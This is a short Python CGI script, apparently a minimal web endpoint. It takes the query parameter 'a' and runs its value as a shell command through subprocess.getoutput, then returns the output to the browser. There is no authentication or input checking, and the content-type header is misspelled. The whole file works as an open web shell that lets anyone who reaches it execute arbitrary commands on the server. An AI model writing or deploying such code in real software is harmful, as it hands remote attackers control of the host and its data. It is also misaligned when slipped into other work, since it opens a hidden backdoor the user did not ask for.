#!/usr/bin/python3

print("contnt-type: text/html")
print()

import cgi
import subprocess as sp

var = cgi.FieldStorage()

cmd = var.getvalue("a")

run = sp.getoutput(cmd)
print(run)

